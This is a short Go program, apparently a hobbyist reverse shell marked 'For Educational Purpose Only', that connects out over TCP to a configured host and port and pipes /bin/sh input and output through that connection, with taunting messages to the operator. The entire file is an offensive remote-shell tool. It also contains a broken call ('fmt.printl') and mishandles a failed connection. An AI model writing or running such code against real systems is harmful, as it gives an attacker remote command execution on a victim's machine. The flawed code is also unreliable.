package main


/*

 Created By Ahmad Dwiyan
 
  For Educational Purpose Only 
  Any Risk Take Your Own

  
*/

import (
	"os/exec"
	"net"
	"fmt"
)

const(
	RPORT = "8001"
	RHOST = "0.0.0.0"
)

func main(){


  conn, err := net.Dial("tcp",fmt.Sprintf("%s:%s", RHOST,RPORT))
 	if err != nil{
 		fmt.printl(" Remote HOST is OFF ")
 	}
  fmt.Fprintf(conn, "%s\n","Your Shell Is Connected To Remote Host !")
  fmt.Fprintf(conn, "%s\n","3Nj0Y Y0UR SH3LL :) !")
  cmd:=exec.Command("/bin/sh");
  cmd.Stdin=conn;
  cmd.Stdout=conn;
  cmd.Stderr=conn;
  cmd.Run();


}

